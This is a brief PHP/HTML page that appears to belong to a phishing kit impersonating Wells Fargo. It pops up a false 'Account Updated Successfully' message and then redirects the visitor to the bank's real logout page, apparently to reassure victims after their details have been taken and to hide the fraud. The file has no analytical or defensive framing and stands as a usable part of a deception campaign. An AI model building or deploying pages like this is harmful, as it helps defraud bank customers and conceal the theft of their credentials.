﻿<?php
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<link rel="shortcut icon" type="image/x-icon" href="rice/muyiba.ico"></link><link rel="icon" type="image/x-icon" href="rice/olori.ico"><title></title>
<META http-equiv="refresh" content="3;URL=https://connect.secure.wellsfargo.com/auth/logout">
</head>
<script>
alert("Account Updated Successfully");
</script>
<body>
<br>
Loading...</a>
</body>
</html>